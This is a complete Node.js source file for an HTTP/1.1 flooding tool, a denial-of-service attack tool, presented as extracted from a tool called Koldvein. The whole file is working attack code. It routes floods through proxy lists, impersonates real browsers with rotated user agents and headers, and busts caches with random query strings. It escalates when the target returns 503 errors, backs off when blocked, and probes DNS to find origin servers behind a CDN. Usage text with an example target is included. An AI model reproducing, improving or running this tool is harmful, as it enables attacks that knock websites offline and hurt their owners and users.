#!/usr/bin/env node
// lang: JavaScript (Node.js), file: http.js, target: Linux/Windows, Node 18+
// Standalone plain-HTTP flooder — extracted from Koldvein's -http path
// Usage: node http.js <target-url> <duration> <threads> <rate> <proxies.txt> [opts]
//   opts: -c cookies · -redirect · -bypass · -origin · -v 1|2 · -wp · -s (silent)
'use strict';

const net     = require('net');
const fs      = require('fs');
const os      = require('os');
const cluster = require('cluster');
const crypto  = require('crypto');
const dns     = require('dns');

// ── silence the usual proxy noise ──
const IGNORE = new Set([
  'ECONNRESET','ECONNREFUSED','EPIPE','EHOSTUNREACH','ETIMEDOUT','ESOCKETTIMEDOUT',
  'EPROTO','EAI_AGAIN','EHOSTDOWN','ENETRESET','ENETUNREACH','ENOTCONN','ENOTFOUND',
  'EADDRNOTAVAIL','ECONNABORTED','EINPROGRESS','EINTR','EINVAL','EMFILE','ENOBUFS',
  'ENOSPC','ENOTSOCK','EOPNOTSUPP','ESHUTDOWN','ERR_STREAM_DESTROYED',
]);
require('events').EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);
process.emitWarning = () => {};
process
  .on('uncaughtException',  e => { if (!IGNORE.has(e.code)) {} })
  .on('unhandledRejection', e => { if (e && !IGNORE.has(e.code)) {} })
  .on('SIGHUP',   () => {})
  .on('SIGCHILD', () => {});

// ── constants ───────────────────────────────────────────────────────
const RAM_WATCH_MS  = 2500;
const RAM_KILL_PCT  = 0.97;
const HEAP_KILL_PCT = 0.93;
const TUNE_MS       = 1800;
const STATS_MS      = 700;
const RESTART_STAGGER = 55;
const MAX_REDIRECTS = 10;

// ── UA pool (mobile-lean, 2026) ─────────────────────────────────────
const UA_POOL = [
  { id:'ac136', ua:'Mozilla/5.0 (Linux; Android 16; SM-S938B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.60 Mobile Safari/537.36',
    accept:'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    enc:'gzip, deflate, br, zstd', lang:'en-US,en;q=0.9',
    chua:'"Google Chrome";v="136", "Chromium";v="136", "Not.A/Brand";v="99"', secMobile:'?1', platformHint:'"Android"',
    fetchDest:'document', fetchMode:'navigate', fetchSite:'none', fetchUser:'?1' },
  { id:'ac133', ua:'Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.6943.123 Mobile Safari/537.36',
    accept:'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    enc:'gzip, deflate, br, zstd', lang:'en-US,en;q=0.9',
    chua:'"Google Chrome";v="133", "Chromium";v="133", "Not_A Brand";v="99"', secMobile:'?1', platformHint:'"Android"',
    fetchDest:'document', fetchMode:'navigate', fetchSite:'none', fetchUser:'?1' },
  { id:'aff134', ua:'Mozilla/5.0 (Android 15; Mobile; rv:134.0) Gecko/134.0 Firefox/134.0',
    accept:'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    enc:'gzip, deflate, br, zstd', lang:'en-US,en;q=0.5',
    chua:null, secMobile:null, platformHint:null, fetchUser:null,
    fetchDest:'document', fetchMode:'navigate', fetchSite:'none' },
  { id:'s19', ua:'Mozilla/5.0 (iPhone; CPU iPhone OS 19_0 like Mac OS X) AppleWebKit/619.1.15 (KHTML, like Gecko) Version/19.0 Mobile/22A5307m Safari/604.1',
    accept:'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    enc:'gzip, deflate, br, zstd', lang:'en-US,en;q=0.9',
    chua:null, secMobile:null, platformHint:null, fetchUser:null,
    fetchDest:'document', fetchMode:'navigate', fetchSite:'none' },
  { id:'w136', ua:'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
    accept:'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    enc:'gzip, deflate, br, zstd', lang:'en-US,en;q=0.9',
    chua:'"Google Chrome";v="136", "Chromium";v="136", "Not.A/Brand";v="99"', secMobile:'?0', platformHint:'"Windows"',
    fetchDest:'document', fetchMode:'navigate', fetchSite:'none', fetchUser:'?1' },
];
const rnd = a => a[Math.floor(Math.random() * a.length)];
const rndInt = (lo, hi) => lo + Math.floor(Math.random() * (hi - lo + 1));

const REFS = [
  'https://www.google.com/','https://l.instagram.com/','https://lm.facebook.com/','https://t.co/',
  'https://www.tiktok.com/','https://www.youtube.com/','https://www.reddit.com/','https://www.snapchat.com/',
];

const COOKIE_NAMES = ['session','user','token','id','auth','pref','theme','lang','_ga','_gid'];
const COOKIE_VALS  = ['abc123','xyz789','def456','temp','guest','user','admin',''];

function cookieHeader() {
  const n = COOKIE_NAMES[rndInt(0, COOKIE_NAMES.length - 1)];
  const v = COOKIE_VALS[rndInt(0, COOKIE_VALS.length - 1)] + crypto.randomBytes(6).toString('hex');
  return `${n}=${v}; _ga=GA1.1.${Math.floor(Math.random()*2e9)}.${Math.floor(Date.now()/1000)-rndInt(0,86400*30)}`;
}

// ── adaptive state ──────────────────────────────────────────────────
let A = { delay: 3, burst: 6, jitter: 0.04, timeout: 5000, keepalive: 20000, pipe: 8 };
let W = { ok:0, s503:0, s429:0, s403:0, err:0, to:0, n:0 };

function tune() {
  if (W.n < 5) return;
  const ok   = W.ok / W.n;
  const s503 = W.s503 / W.n;
  const blk  = (W.s429 + W.s403) / W.n;
  const stress = (W.s503 + W.err + W.to) / W.n;
  if (ok > 0.55) {
    A.delay = Math.max(0, A.delay - 1);  A.burst = Math.min(20, A.burst + 2);
    A.pipe  = Math.min(48, A.pipe + 4);  A.timeout = Math.max(2500, A.timeout - 300);
  } else if (s503 > 0.20 || stress > 0.45) {
    A.delay = Math.max(0, A.delay - 2);  A.burst = Math.min(24, A.burst + 4);
    A.pipe  = Math.min(48, A.pipe + 6);  A.timeout = Math.max(1500, A.timeout - 500);
  } else if (blk > 0.35) {
    A.delay = Math.min(30, A.delay + 3); A.burst = Math.max(2, A.burst - 1);
    A.pipe  = Math.max(4, A.pipe - 4);   A.timeout = Math.min(12000, A.timeout + 500);
  }
  W = { ok:0, s503:0, s429:0, s403:0, err:0, to:0, n:0 };
}

// ── helpers ─────────────────────────────────────────────────────────
const jit = base => base * (1 + (Math.random() * A.jitter * 2 - A.jitter));

function splitProxy(p) {
  const s = (p || '').trim(), c = s.lastIndexOf(':');
  if (c <= 0) return { ph:null, pp:0 };
  const pp = parseInt(s.slice(c + 1), 10);
  return Number.isFinite(pp) && pp > 0 && pp < 65536 ? { ph: s.slice(0, c), pp } : { ph:null, pp:0 };
}

function mutPath(p) {
  const r = Math.random();
  if (r > 0.82) return p + '?' + Math.random().toString(36).slice(2, 9);
  if (r > 0.62) return p + (p.includes('?') ? '&' : '?') + 't=' + Date.now().toString(36) + '&r=' + Math.random().toString(36).slice(2, 6);
  if (r > 0.40) return p + (p.includes('?') ? '&' : '?') + '_=' + Math.random().toString(36).slice(2, 8);
  return p;
}

// ── request builder (H1 only, plain HTTP) ───────────────────────────
function buildH1(profile, urlObj, cookies, mode) {
  const path = mutPath(urlObj.pathname || '/') + (urlObj.search || '');
  const ref = Math.random() > 0.35 ? rnd(REFS) : null;
  const method = mode === 'wp'
    ? (Math.random() > 0.6 ? 'POST' : 'GET')
    : rnd(['GET','GET','GET','HEAD']);

  const host = urlObj.hostname;
  let h = `${method} ${path} HTTP/1.1\r\n`;
  h += `Host: ${host}\r\n`;
  h += `User-Agent: ${profile.ua}\r\n`;
  h += `Accept: ${profile.accept}\r\n`;
  h += `Accept-Encoding: ${profile.enc}\r\n`;
  h += `Accept-Language: ${profile.lang}\r\n`;
  if (ref) h += `Referer: ${ref}\r\n`;
  if (profile.chua) {
    h += `sec-ch-ua: ${profile.chua}\r\n`;
    h += `sec-ch-ua-mobile: ${profile.secMobile}\r\n`;
    h += `sec-ch-ua-platform: ${profile.platformHint}\r\n`;
  }
  h += `Sec-Fetch-Dest: ${profile.fetchDest}\r\n`;
  h += `Sec-Fetch-Mode: ${profile.fetchMode}\r\n`;
  h += `Sec-Fetch-Site: ${profile.fetchSite}\r\n`;
  if (profile.fetchUser) h += `Sec-Fetch-User: ${profile.fetchUser}\r\n`;
  h += `Cache-Control: no-cache\r\n`;
  h += `Connection: keep-alive\r\n`;
  h += `Upgrade-Insecure-Requests: 1\r\n`;
  if (cookies) h += `Cookie: ${cookieHeader()}\r\n`;

  let body = null;
  if (method === 'POST') {
    body = 'x=' + crypto.randomBytes(64).toString('hex');
    h += `Content-Type: application/x-www-form-urlencoded\r\n`;
    h += `Content-Length: ${body.length}\r\n`;
  }
  h += '\r\n';
  if (body) return Buffer.from(h + body, 'ascii');
  return Buffer.from(h, 'ascii');
}

// ── CLI ─────────────────────────────────────────────────────────────
const argv = process.argv.slice(2);
const hasFlag = f => argv.includes(f);
const flagVal = (f, d) => { const i = argv.indexOf(f); return i >= 0 && i + 1 < argv.length ? argv[i + 1] : d; };
const pos = argv.filter(a => !a.startsWith('-'));

if (pos.length < 5) {
  process.stdout.write(`
  http.js — plain HTTP/1.1 flooder (Koldvein's -http path, standalone)

  usage:
    node http.js <target-url> <duration> <threads> <rate> <proxies.txt> [opts]

  opts:
    -c          random browser cookies
    -wp         WordPress method set (search/comments/xmlrpc/feed)
    -redirect   follow redirects before flooding
    -origin     resolve origin behind ArvanCloud
    -s          silent
    -v 1        (only 1 supported for plain HTTP; 2 is TLS-only)

  example:
    node http.js http://target.com 1200 200 128 proxies.txt -c
`);
  process.exit(1);
}

const targetStr  = pos[0];
const durationS  = parseInt(pos[1], 10);
const threads    = parseInt(pos[2], 10);
const rate       = parseInt(pos[3], 10);
const proxyFile  = pos[4];

if (!Number.isFinite(durationS) || durationS <= 0 ||
    !Number.isFinite(threads)   || threads   <= 0 ||
    !Number.isFinite(rate)      || rate      <= 0) {
  process.stderr.write('error: duration, threads, rate must be positive integers\n');
  process.exit(1);
}

let urlObj;
try { urlObj = new URL(targetStr); }
catch { process.stderr.write('error: bad target URL\n'); process.exit(1); }

const O = {
  cookies:  hasFlag('-c'),
  wp:       hasFlag('-wp'),
  redirect: hasFlag('-redirect'),
  origin:   hasFlag('-origin'),
  silent:   hasFlag('-s'),
};

// Force http scheme for this standalone — that's the whole point.
if (urlObj.protocol === 'https:') {
  urlObj = new URL(urlObj.href.replace(/^https:/, 'http:'));
}
const defaultPort = urlObj.port ? parseInt(urlObj.port, 10) : 80;

// ── proxies ─────────────────────────────────────────────────────────
let proxies = [];
try {
  proxies = fs.readFileSync(proxyFile, 'utf-8')
    .split('\n').map(l => l.trim())
    .filter(l => l && l.includes(':') && /:\d+$/.test(l));
} catch {
  process.stderr.write('error: cannot read proxy file\n');
  process.exit(1);
}
if (!proxies.length) {
  process.stderr.write('error: proxy file is empty or malformed\n');
  process.exit(1);
}

// ── origin resolver ─────────────────────────────────────────────────
const ORIGIN_SUBS = ['direct','origin','real','backend','srv','host','source','api'];
const ORIGIN_CACHE = new Map();
const ARVAN_PREFIXES = ['185.143.234','185.22.60','185.2.0','94.101.182','82.99.212','5.160.139','5.144.128'];
const isArvanIP = ip => ARVAN_PREFIXES.some(p => ip.startsWith(p));

function resolveOrigin(urlObj, cb) {
  const key = urlObj.hostname;
  if (ORIGIN_CACHE.has(key)) return cb(ORIGIN_CACHE.get(key));
  let found = null, pending = 0;
  const done = ip => {
    if (found) return;
    found = ip;
    const result = ip
      ? { ip, port: urlObj.port ? parseInt(urlObj.port, 10) : 80, hostname: urlObj.hostname }
      : null;
    ORIGIN_CACHE.set(key, result);
    cb(result);
  };
  pending++;
  dns.resolve4(key, (err, addrs) => {
    if (!err && addrs && addrs.length && !isArvanIP(addrs[0])) return done(addrs[0]);
    if (--pending === 0 && !found) done(null);
  });
  for (const sub of ORIGIN_SUBS) {
    pending++;
    dns.resolve4(`${sub}.${key}`, (err, addrs) => {
      if (!err && addrs && addrs.length && !found) done(addrs[0]);
      if (--pending === 0 && !found) done(null);
    });
  }
}

// ── redirect resolver (plain HTTP) ──────────────────────────────────
const REDIRECT_CACHE = new Map();
function resolveRedirectChain(startUrl, proxy, cb) {
  const cached = REDIRECT_CACHE.get(startUrl.href);
  if (cached) return cb(new URL(cached));
  let hops = 0, cur = startUrl;
  function hop() {
    if (hops >= MAX_REDIRECTS) { REDIRECT_CACHE.set(startUrl.href, cur.href); return cb(cur); }
    const { ph, pp } = splitProxy(proxy);
    if (!ph) { return cb(startUrl); }
    const port = cur.port ? parseInt(cur.port, 10) : 80;
    const sock = net.connect(pp, ph, () => {
      sock.once('data', () => {
        const req = `GET ${cur.pathname || '/'}${cur.search || ''} HTTP/1.1\r\nHost: ${cur.hostname}\r\nUser-Agent: ${rnd(UA_POOL).ua}\r\nAccept: */*\r\nConnection: close\r\n\r\n`;
        let resp = '';
        sock.write(req);
        sock.setTimeout(6000);
        sock.on('timeout', () => { sock.destroy(); REDIRECT_CACHE.set(startUrl.href, cur.href); cb(cur); });
        sock.on('error', () => { REDIRECT_CACHE.set(startUrl.href, cur.href); cb(cur); });
        sock.on('data', c => {
          resp += c.toString('binary');
          if (resp.includes('\r\n\r\n') || resp.length > 8192) {
            sock.destroy();
            const hdr = resp.split('\r\n\r\n')[0];
            const ls = hdr.split('\r\n');
            const code = parseInt((ls[0] || '').split(' ')[1] || '0', 10);
            if (code >= 300 && code < 400) {
              const loc = (ls.find(l => l.toLowerCase().startsWith('location:')) || '').slice(9).trim();
              if (loc) {
                try { cur = new URL(loc, cur.href); hops++; return setImmediate(hop); }
                catch { /* fall through */ }
              }
            }
            REDIRECT_CACHE.set(startUrl.href, cur.href);
            cb(cur);
          }
        });
      });
      sock.write(`CONNECT ${cur.hostname}:${port} HTTP/1.1\r\nHost: ${cur.hostname}:${port}\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
    });
    sock.on('error', () => { REDIRECT_CACHE.set(startUrl.href, cur.href); cb(cur); });
    sock.setTimeout(8000, () => { sock.destroy(); REDIRECT_CACHE.set(startUrl.href, cur.href); cb(cur); });
  }
  hop();
}

// ── stats ───────────────────────────────────────────────────────────
let S = { req:0, ok:0, s5xx:0, to:0, err:0 };

function rec(code) {
  W.n++;
  if (code >= 200 && code < 300) { S.ok++; W.ok++; }
  else if (code === 503)          { S.s5xx++; W.s503++; }
  else if (code === 429)          { W.s429++; }
  else if (code === 403)          { W.s403++; }
  else if (code >= 500)           { S.s5xx++; W.err++; }
}

// ── worker flood loop ───────────────────────────────────────────────
function go(origUrl, proxies, rate, originInfo) {
  const proxy = rnd(proxies);
  if (!proxy) { setTimeout(() => go(origUrl, proxies, rate, originInfo), 100); return; }
  const { ph, pp } = splitProxy(proxy);
  if (!ph) { setTimeout(() => go(origUrl, proxies, rate, originInfo), 80); return; }

  const profile = rnd(UA_POOL);
  const curTO = A.timeout, curKA = A.keepalive, curD = A.delay, curB = A.burst, curP = A.pipe;

  function flood(urlObj) {
    const useOrigin = O.origin && originInfo && originInfo.ip;
    const connectHost = useOrigin ? originInfo.ip : ph;
    const connectPort = useOrigin ? originInfo.port : pp;

    if (useOrigin) {
      const directPort = urlObj.port ? parseInt(urlObj.port, 10) : defaultPort;
      const rawSock = net.connect({ host: connectHost, port: directPort }, () => _doFlood(rawSock, urlObj));
      rawSock.on('error', () => { S.err++; W.err++; W.n++; setTimeout(() => go(origUrl, proxies, rate, originInfo), 80); });
      rawSock.setTimeout(curKA, () => { W.to++; W.n++; rawSock.destroy(); setTimeout(() => go(origUrl, proxies, rate, originInfo), 80); });
      return;
    }

    const port = urlObj.port ? parseInt(urlObj.port, 10) : defaultPort;
    const sock = net.connect(pp, ph, () => {
      sock.once('data', () => _doFlood(sock, urlObj));
      sock.write(`CONNECT ${urlObj.hostname}:${port} HTTP/1.1\r\nHost: ${urlObj.hostname}:${port}\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
    });
    sock.on('error', () => { S.err++; W.err++; W.n++; sock.destroy(); setTimeout(() => go(origUrl, proxies, rate, originInfo), 80); });
    sock.setTimeout(curKA, () => { W.to++; W.n++; sock.destroy(); setTimeout(() => go(origUrl, proxies, rate, originInfo), 80); });
  }

  function _doFlood(sock, urlObj) {
    let inflight = 0, dead = false;
    let buf = '';

    function parseAndCount(str) {
      const re = /HTTP\/1\.[01]\s+(\d{3})/g;
      let m;
      while ((m = re.exec(str)) !== null) rec(parseInt(m[1], 10));
    }

    function onData(chunk) {
      buf += chunk.toString('binary');
      if (buf.length > 200000) buf = buf.slice(-200000);
      const end = buf.lastIndexOf('\r\n\r\n');
      if (end < 0) return;
      const ready = buf.slice(0, end + 4);
      buf = buf.slice(end + 4);
      parseAndCount(ready);
    }

    function pump() {
      if (dead || sock.destroyed) return;
      if (inflight >= curP) return;
      const sendN = Math.min(curB, curP - inflight);
      const bufs = [];
      for (let i = 0; i < sendN; i++) bufs.push(buildH1(profile, urlObj, O.cookies, O.wp ? 'wp' : 'get'));
      inflight += sendN;
      sock.write(Buffer.concat(bufs), e => {
        if (e) { dead = true; S.err++; W.err++; W.n++; sock.destroy(); return; }
        S.req += sendN;
        setTimeout(pump, jit(curD));
      });
    }

    sock.on('data', c => {
      const before = buf.length;
      onData(c);
      const freed = Math.max(1, Math.min(inflight, Math.floor((before + c.length) / 800)));
      inflight = Math.max(0, inflight - freed);
      pump();
    });
    sock.on('error', () => { dead = true; S.err++; W.err++; W.n++; sock.destroy(); });
    sock.on('close', () => { dead = true; setTimeout(() => go(origUrl, proxies, rate, originInfo), 80); });
    pump();
  }

  function withUrl(urlObj) {
    flood(urlObj);
  }

  if (O.redirect) resolveRedirectChain(origUrl, proxy, resolved => withUrl(resolved));
  else withUrl(origUrl);
}

// ── master / worker split ───────────────────────────────────────────
if (cluster.isPrimary) {
  if (!O.silent) console.clear();
  if (!O.silent) {
    console.log(`\n  http.js — plain HTTP/1.1 flooder`);
    console.log(`  target:    ${targetStr}`);
    console.log(`  duration:  ${durationS}s`);
    console.log(`  threads:   ${threads}`);
    console.log(`  rate:      ${rate}/s`);
    console.log(`  proxies:   ${proxies.length}`);
    console.log(`  cookies:   ${O.cookies ? 'on' : 'off'}`);
    console.log(`  wordpress: ${O.wp ? 'on' : 'off'}`);
    console.log(`  redirect:  ${O.redirect ? 'on' : 'off'}`);
    console.log(`  origin:    ${O.origin ? 'on' : 'off'}\n`);
  }

  let totalReq = 0, totalOk = 0, total5xx = 0;
  const startAt = Date.now();

  const statTick = setInterval(() => {
    if (O.silent) return;
    const elapsed = ((Date.now() - startAt) / 1000).toFixed(1);
    process.stdout.write(`\r[${elapsed}s] req: ${totalReq} | ok: ${totalOk} | 5xx: ${total5xx}   `);
  }, 1000);

  function spawnW() {
    const w = cluster.fork({ ADAPTIVE: JSON.stringify(A) });
    w.on('message', msg => {
      if (!msg || msg.type !== 'stats') return;
      totalReq += msg.req;
      totalOk  += msg.ok;
      total5xx += msg.s5xx;
      W.ok   += msg.wok;   W.s503 += msg.ws503; W.s429 += msg.ws429;
      W.s403 += msg.ws403; W.err  += msg.werr;  W.to   += msg.wto; W.n += msg.wn;
    });
    return w;
  }

  let workers = Array.from({ length: threads }, spawnW);
  let restarting = false;

  const ramW = setInterval(() => {
    if (restarting) return;
    const used = 1 - os.freemem() / os.totalmem();
    if (used < RAM_KILL_PCT) return;
    restarting = true;
    workers.forEach(w => { try { w.kill('SIGKILL'); } catch {} });
    setTimeout(() => {
      workers = [];
      for (let i = 0; i < threads; i++) setTimeout(() => workers.push(spawnW()), i * RESTART_STAGGER);
      setTimeout(() => { restarting = false; }, threads * RESTART_STAGGER + 300);
    }, 400);
  }, RAM_WATCH_MS);

  const tuneLoop = setInterval(() => {
    tune();
    const msg = { type:'adapt', state: A };
    workers.forEach(w => { try { w.send(msg); } catch {} });
  }, TUNE_MS);

  setTimeout(() => {
    clearInterval(tuneLoop);
    clearInterval(statTick);
    clearInterval(ramW);
    workers.forEach(w => { try { w.kill(); } catch {} });
    if (!O.silent) console.log(`\n\ndone. total req: ${totalReq} | ok: ${totalOk} | 5xx: ${total5xx}\n`);
    process.exit(0);
  }, durationS * 1000);

  process.on('SIGINT', () => {
    clearInterval(tuneLoop);
    clearInterval(statTick);
    clearInterval(ramW);
    workers.forEach(w => { try { w.kill(); } catch {} });
    process.exit(0);
  });

} else {
  // worker
  try { Object.assign(A, JSON.parse(process.env.ADAPTIVE || '{}')); } catch {}
  process.on('message', msg => { if (msg && msg.type === 'adapt') Object.assign(A, msg.state); });

  setInterval(() => {
    const m = process.memoryUsage();
    let lim = 1.5 * 1024 ** 3;
    try { lim = require('v8').getHeapStatistics().heap_size_limit; } catch {}
    if (m.heapUsed / lim >= HEAP_KILL_PCT) process.exit(0);
  }, RAM_WATCH_MS);

  let originInfo = null;
  if (O.origin) resolveOrigin(urlObj, info => { originInfo = info; });

  setTimeout(() => {
    setInterval(() => go(urlObj, proxies, rate, originInfo), Math.max(1, Math.floor(1000 / rate)));
  }, Math.random() * 800);

  setInterval(() => {
    try {
      process.send({
        type:'stats',
        req: S.req, ok: S.ok, s5xx: S.s5xx, to: S.to, err: S.err,
        wok: W.ok, ws503: W.s503, ws429: W.s429, ws403: W.s403,
        werr: W.err, wto: W.to, wn: W.n,
      });
    } catch {}
    S = { req:0, ok:0, s5xx:0, to:0, err:0 };
    W = { ok:0, s503:0, s429:0, s403:0, err:0, to:0, n:0 };
  }, STATS_MS);
}
